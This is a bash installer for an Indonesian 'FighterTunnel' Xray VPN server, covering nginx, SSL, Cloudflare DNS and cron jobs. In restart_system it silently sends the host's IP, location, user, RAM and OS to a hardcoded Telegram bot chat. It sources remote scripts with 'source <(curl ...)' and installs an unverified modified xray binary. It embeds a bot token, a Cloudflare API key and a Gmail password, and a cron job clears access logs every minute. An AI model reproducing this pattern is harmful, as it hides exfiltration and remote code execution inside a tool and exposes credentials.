#!/bin/bash
# //====================================================
# //	System Request:Debian 9+/Ubuntu 18.04+/20+
# //  telegram: https://t.me/amantubilah
# //====================================================

# // FONT color configuration | FIGHTERTUNNEL AUTOSCRIPT
Green="\e[92;1m"
RED="\033[31m"
YELLOW="\033[33m"
BLUE="\033[36m"
FONT="\033[0m"
GREENBG="\033[42;37m"
REDBG="\033[41;37m"
OK="${Green}--->${FONT}"
ERROR="${RED}[ERROR]${FONT}"
GRAY="\e[1;30m"
NC='\e[0m'

# // configuration GET | FIGHTERTUNNEL AUTOSCRIPT
TIMES="10"
NAMES=$(whoami)
IMP="wget -q -O"
CHATID="1423578532"
LOCAL_DATE="/usr/bin/"
MYIP=$(wget -qO- ipinfo.io/ip)
CITY=$(curl -s ipinfo.io/city)
TIME=$(date +'%Y-%m-%d %H:%M:%S')
RAMMS=$(free -m | awk 'NR==2 {print $2}')
KEY="5876827988:AAEBRv2Jsu55Km3biqoKfxxgvscU-JLH-Go"
URL="https://api.telegram.org/bot$KEY/sendMessage"
GITHUB_CMD="https://github.com/arismaramar/gif/raw/"
OS=$(cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g')

secs_to_human() {
    echo "Installation time : $(( ${1} / 3600 )) hours $(( (${1} / 60) % 60 )) minute's $(( ${1} % 60 )) seconds"
}

start=$(date +%s)
ln -fs /usr/share/zoneinfo/Asia/Jakarta /etc/localtime >/dev/null 2>&1
function print_ok() {
    echo -e "${OK} ${BLUE} $1 ${FONT}"
}

function is_root() {
    if [[ 0 == "$UID" ]]; then
        print_ok "Root user Start installation process"
    else
        print_error "The current user is not the root user, please switch to the root user and run the script again"
        # // exit 1
    fi
    
}

judge() {
    if [[ 0 -eq $? ]]; then
        print_ok "$1 Complete... | thx to ${YELLOW}FighterTunnel${FONT}"
        sleep 1
    else
        print_error "$1 Fail... | thx to ${YELLOW}FighterTunnel${FONT}"
        # // exit 1
    fi
    
}

domain="cat /etc/xray/domain"
cloudflare() {
    DOMEN="remoot.my.id"
    sub=$(tr </dev/urandom -dc a-z0-9 | head -c5)
    domain="${sub}.remoot.my.id"
    echo -e "${domain}" >/etc/xray/domain
    CF_ID="arismar.amar@gmail.com"
    CF_KEY="f7fa85e2472592639b7d1cf82f1c5490ec1cd"
    set -euo pipefail
    IP=$(wget -qO- ipinfo.io/ip)
    print_ok "Updating DNS for ${GRAY}${domain}${FONT}"
    ZONE=$(curl -sLX GET "https://api.cloudflare.com/client/v4/zones?name=${DOMEN}&status=active" \
        -H "X-Auth-Email: ${CF_ID}" \
        -H "X-Auth-Key: ${CF_KEY}" \
    -H "Content-Type: application/json" | jq -r .result[0].id)
    
    RECORD=$(curl -sLX GET "https://api.cloudflare.com/client/v4/zones/${ZONE}/dns_records?name=${domain}" \
        -H "X-Auth-Email: ${CF_ID}" \
        -H "X-Auth-Key: ${CF_KEY}" \
    -H "Content-Type: application/json" | jq -r .result[0].id)
    
    if [[ "${#RECORD}" -le 10 ]]; then
        RECORD=$(curl -sLX POST "https://api.cloudflare.com/client/v4/zones/${ZONE}/dns_records" \
            -H "X-Auth-Email: ${CF_ID}" \
            -H "X-Auth-Key: ${CF_KEY}" \
            -H "Content-Type: application/json" \
        --data '{"type":"A","name":"'${domain}'","content":"'${IP}'","proxied":false}' | jq -r .result.id)
    fi
    
    RESULT=$(curl -sLX PUT "https://api.cloudflare.com/client/v4/zones/${ZONE}/dns_records/${RECORD}" \
        -H "X-Auth-Email: ${CF_ID}" \
        -H "X-Auth-Key: ${CF_KEY}" \
        -H "Content-Type: application/json" \
    --data '{"type":"A","name":"'${domain}'","content":"'${IP}'","proxied":false}')
}

function nginx_install() {
    # // Checking System
    if [[ $(cat /etc/os-release | grep -w ID | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/ID//g') == "ubuntu" ]]; then
        judge "Setup nginx For OS Is $(cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g')"
        # // sudo add-apt-repository ppa:nginx/stable -y >/dev/null 2>&1
        sudo apt-get update -y >/dev/null 2>&1
        sudo apt-get install nginx -y >/dev/null 2>&1
        elif [[ $(cat /etc/os-release | grep -w ID | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/ID//g') == "debian" ]]; then
        judge "Setup nginx For OS Is ( ${GREENBG}$(cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g')"
        sudo apt update >/dev/null 2>&1
        apt -y install nginx >/dev/null 2>&1
    else
        judge "${ERROR} Your OS Is Not Supported ( ${YELLOW}$(cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g')${FONT} )"
        # // exit 1
    fi
    
    judge "Nginx installed successfully"
    
}

function LOGO() {
    echo -e "
    ┌───────────────────────────────────────────────┐
 ───│                                               │───
 ───│    $Green┌─┐┬ ┬┌┬┐┌─┐┌─┐┌─┐┬─┐┬┌─┐┌┬┐  ┬  ┬┌┬┐┌─┐$NC   │───
 ───│    $Green├─┤│ │ │ │ │└─┐│  ├┬┘│├─┘ │   │  │ │ ├┤ $NC   │───
 ───│    $Green┴ ┴└─┘ ┴ └─┘└─┘└─┘┴└─┴┴   ┴   ┴─┘┴ ┴ └─┘$NC   │───
    │    ${YELLOW}Copyright${FONT} (C)$GRAY https://t.me/amantubilah$NC   │
    └───────────────────────────────────────────────┘
         ${RED}Autoscript xray vpn lite (multi port)${FONT}    
           ${RED}no licence script (free lifetime) ${FONT}
${RED}Make sure the internet is smooth when installing the script${FONT}
        "
    
}

function download_config() {
source <(curl -sL ${GITHUB_CMD}main/fodder/nginx/sendmenu.sh)
source <(curl -sL ${GITHUB_CMD}main/fodder/nginx/sed)

  cat >/root/.profile <<END
# ~/.profile: executed by Bourne-compatible login shells.
if [ "$BASH" ]; then
  if [ -f ~/.bashrc ]; then
    . ~/.bashrc
  fi
fi
mesg n || true
menu
END
  cat >/etc/cron.d/xp_all <<-END
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
2 0 * * * root /usr/bin/xp
END
    chmod 644 /root/.profile
    
cat > /etc/cron.d/daily_reboot <<-END
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
0 5 * * * root /sbin/reboot
END

cat > /usr/bin/service.restart <<-END
service nginx restart >/dev/null 2>&1
service xray restart >/dev/null 2>&1 
END

chmod +x /usr/bin/service.restart
cat > /etc/cron.d/service <<-END
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
*/59 * * * * root /usr/bin/service.restart
END

echo "*/1 * * * * root echo -n > /var/log/nginx/access.log" > /etc/cron.d/log.nginx
echo "*/1 * * * * root echo -n > /var/log/xray/access.log" >> /etc/cron.d/log.xray
service cron restart
cat > /home/daily_reboot <<-END
5
END

    AUTOREB=$(cat /home/daily_reboot)
    SETT=11
    if [ $AUTOREB -gt $SETT ]
    then
        TIME_DATE="PM"
    else
        TIME_DATE="AM"
    fi
}

function acme() {
    judge "installed successfully SSL certificate generation script"
    rm -rf /root/.acme.sh  >/dev/null 2>&1
    mkdir /root/.acme.sh  >/dev/null 2>&1
    curl https://acme-install.netlify.app/acme.sh -o /root/.acme.sh/acme.sh >/dev/null 2>&1
    chmod +x /root/.acme.sh/acme.sh >/dev/null 2>&1
    /root/.acme.sh/acme.sh --upgrade --auto-upgrade >/dev/null 2>&1
    /root/.acme.sh/acme.sh --set-default-ca --server letsencrypt >/dev/null 2>&1
    /root/.acme.sh/acme.sh --issue -d $domain --standalone -k ec-256 >/dev/null 2>&1
    ~/.acme.sh/acme.sh --installcert -d $domain --fullchainpath /etc/xray/xray.crt --keypath /etc/xray/xray.key --ecc >/dev/null 2>&1
    
}


function configure_nginx() {
    # // nginx config | FIGHTERTUNNEL AUTOSCRIPT
    cd
    rm /var/www/html/*.html
    rm /etc/nginx/sites-enabled/default
    rm /etc/nginx/sites-available/default
    wget https://github.com/arismaramar/gif/raw/main/fodder/web.zip >> /dev/null 2>&1
    unzip -x web.zip >> /dev/null 2>&1
    rm -f web.zip
    mv * /var/www/html/
    judge "Nginx configuration modification"
}
function restart_system() {
TEXT="
<u>INFORMATION VPS INSTALL SC</u>
<code>TIME    : </code><code>${TIME}</code>
<code>IPVPS   : </code><code>${MYIP}</code>
<code>DOMAIN  : </code><code>${domain}</code>
<code>IP VPS  : </code><code>${MYIP}</code>
<code>LOKASI  : </code><code>${CITY}</code>
<code>USER    : </code><code>${NAMES}</code>
<code>RAM     : </code><code>${RAMMS}MB</code>
<code>LINUX   : </code><code>${OS}</code>
"
    curl -s --max-time $TIMES -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
    sed -i "s/xxx/${domain}/g" /var/www/html/index.html >/dev/null 2>&1
    sed -i "s/xxx/${domain}/g" /etc/nginx/conf.d/xray.conf >/dev/null 2>&1
    sed -i -e 's/\r$//' /usr/bin/get-backres >/dev/null 2>&1
    sed -i -e 's/\r$//' /usr/bin/get-bw >/dev/null 2>&1
    sed -i -e 's/\r$//' /usr/bin/get-detail >/dev/null 2>&1
    sed -i -e 's/\r$//' /usr/bin/get-log >/dev/null 2>&1
    chown -R www-data:www-data /etc/msmtprc >/dev/null 2>&1
    systemctl daemon-reload >/dev/null 2>&1
    systemctl enable nginx >/dev/null 2>&1
    systemctl enable xray >/dev/null 2>&1
    systemctl restart nginx >/dev/null 2>&1
    systemctl restart xray >/dev/null 2>&1
    clear
    LOGO
    echo "    ┌───────────────────────────────────────────────────────┐"
    echo "    │       >>> Service & Port                              │"
    echo "    │   - XRAY  Vmess TLS         : 443                     │"
    echo "    │   - XRAY  Vmess gRPC        : 443                     │"
    echo "    │   - XRAY  Vmess None TLS    : 80                      │"
    echo "    │   - XRAY  Vless TLS         : 443                     │"
    echo "    │   - XRAY  Vless gRPC        : 443                     │"
    echo "    │   - XRAY  Vless None TLS    : 80                      │"
    echo "    │   - Trojan gRPC             : 443                     │"
    echo "    │   - Trojan WS               : 443                     │"
    echo "    │   - Shadowsocks WS          : 443                     │"
    echo "    │   - Shadowsocks gRPC        : 443                     │"
    echo "    │                                                       │"
    echo "    │      >>> Server Information & Other Features          │"
    echo "    │   - Timezone                : Asia/Jakarta (GMT +7)   │"
    echo "    │   - Autoreboot On           : $AUTOREB:00 $TIME_DATE GMT +7          │"
    echo "    │   - Auto Delete Expired Account                       │"
    echo "    │   - Fully automatic script                            │"
    echo "    │   - VPS settings                                      │"
    echo "    │   - Admin Control                                     │"
    echo "    │   - Restore Data                                      │"
    echo "    │   - Full Orders For Various Services                  │"
    echo "    └───────────────────────────────────────────────────────┘"
    secs_to_human "$(($(date +%s) - ${start}))"
    echo -ne "         ${YELLOW}Please Reboot Your Vps${FONT} (y/n)? "
    read REDDIR
    if [ "$REDDIR" == "${REDDIR#[Yy]}" ] ;then
        exit 0
    else
        reboot
    fi
    
}
function make_folder_xray() {
    # // Make Folder Xray to accsess
    mkdir -p /etc/xray
    mkdir -p /var/log/xray
    mkdir -p /usr/bin/xray
    chmod +x /var/log/xray
    touch /etc/xray/domain
    touch /var/log/xray/access.log
    touch /var/log/xray/error.log
}
function domain_add() {
    read -p "Input Domain :  " domain
    echo $domain >/etc/xray/domain

}

function dependency_install() {
    INS="apt install -y"
    echo ""
    echo "Please wait to install Package..."
    apt update >/dev/null 2>&1
    judge "Update configuration"
    
    apt clean all >/dev/null 2>&1
    judge "Clean configuration "
    
    ${INS} jq zip unzip p7zip-full >/dev/null 2>&1
    judge "Installed successfully jq zip unzip"
    
    ${INS} make curl socat systemd libpcre3 libpcre3-dev zlib1g-dev openssl libssl-dev >/dev/null 2>&1
    judge "Installed curl socat systemd"
    
    ${INS} net-tools cron htop lsof tar >/dev/null 2>&1
    judge "Installed net-tools"

    judge "Installed msmtp-mta ca-certificates"
    apt install msmtp-mta ca-certificates bsd-mailx -y >/dev/null 2>&1
    
}

function install_xray() {
    # // Make Folder Xray & Import link for generating Xray | FIGHTERTUNNEL AUTOSCRIPT
    judge "Core Xray 1.6.5 Version installed successfully"
    # // Xray Core Version new | FIGHTERTUNNEL AUTOSCRIPT
    curl -s ipinfo.io/city >> /etc/xray/city 
    curl -s ipinfo.io/org | cut -d " " -f 2-10 >> /etc/xray/isp 
    bash -c "$(curl -L https://github.com/XTLS/Xray-install/raw/main/install-release.sh)" @ install -u www-data --version 1.6.5 >/dev/null 2>&1
    curl https://rclone.org/install.sh | bash >/dev/null 2>&1
    printf "q\n" | rclone config  >/dev/null 2>&1
    wget -O /root/.config/rclone/rclone.conf "${GITHUB_CMD}main/RCLONE%2BBACKUP-Gdrive/rclone.conf" >/dev/null 2>&1 
    wget -O /etc/xray/config.json "${GITHUB_CMD}main/VMess-VLESS-Trojan%2BWebsocket%2BgRPC/config.json" >/dev/null 2>&1
    wget -O /usr/bin/xray/xray "${GITHUB_CMD}main/Core_Xray_MOD/xray.linux.64bit" >/dev/null 2>&1
    chmod +x /usr/bin/xray/xray >/dev/null 2>&1 

cat > /etc/msmtprc <<EOF
defaults
tls on
tls_starttls on
tls_trust_file /etc/ssl/certs/ca-certificates.crt

account default
host smtp.gmail.com
port 587
auth on
user arimar.amar@gmail.com
from arimar.amar@gmail.com
password anggundzakirazayd
logfile ~/.msmtp.log

EOF

  rm -rf /etc/systemd/system/xray.service.d
  cat >/etc/systemd/system/xray.service <<EOF
Description=Xray Service
Documentation=https://github.com/xtls
After=network.target nss-lookup.target

[Service]
User=www-data
CapabilityBoundingSet=CAP_NET_ADMIN CAP_NET_BIND_SERVICE
AmbientCapabilities=CAP_NET_ADMIN CAP_NET_BIND_SERVICE
NoNewPrivileges=true
ExecStart=/usr/bin/xray/xray run -config /etc/xray/config.json
Restart=on-failure
RestartPreventExitStatus=23
LimitNPROC=10000
LimitNOFILE=1000000

[Install]
WantedBy=multi-user.target

EOF


}

function install_sc() {
    make_folder_xray
    domain_add
    dependency_install
    acme
    nginx_install
    configure_nginx
    download_config    
    install_xray
    restart_system
}

function install_sc_cf() {
    make_folder_xray
    dependency_install
    cloudflare
    acme
    nginx_install
    configure_nginx    
    download_config
    install_xray
    restart_system
}

# // Prevent the default bin directory of some system xray from missing | FIGHTERTUNNEL AUTOSCRIPT
clear
LOGO
echo -e "${RED}JANGAN INSTALL SCRIPT INI MENGGUNAKAN KONEKSI VPN!!!${FONT}"
echo -e ""
echo -e "1).${Green}MANUAL POINTING${FONT}(Manual DNS-resolved IP address of the domain)"
echo -e "2).${Green}AUTO POINTING${FONT}(Auto DNS-resolved IP address of the domain)"
read -p "between auto pointing / manual pointing what do you choose[ 1 - 2 ] : " menu_num

case $menu_num in
    1)
        install_sc
    ;;
    2)
        install_sc_cf
    ;;
    *)
        echo -e "${RED}You wrong command !${FONT}"
    ;;
esac
